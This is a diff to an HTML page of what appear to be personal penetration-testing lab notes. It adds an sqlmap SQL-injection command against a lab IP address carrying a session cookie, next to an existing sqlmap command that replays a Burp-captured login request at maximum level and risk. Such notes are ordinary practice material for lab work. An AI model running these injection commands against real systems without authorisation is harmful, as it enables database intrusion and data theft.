@@ -200,6 +200,9 @@
 
 <p>Additionally to sqlmap: capture a login request with Burp and save it in a file ex. login.req, than in sqlmap: sqlmap -r login.req --level 5 --risk 3</p>
 
+<p>Using the session cookies and sqlmap: sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
+cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"</p>
+
 <p align="justify">How to add your generated ssh key to your known hosts. It helps with Github also.</p>
 
 <img src="images/ssh_key_add.png">
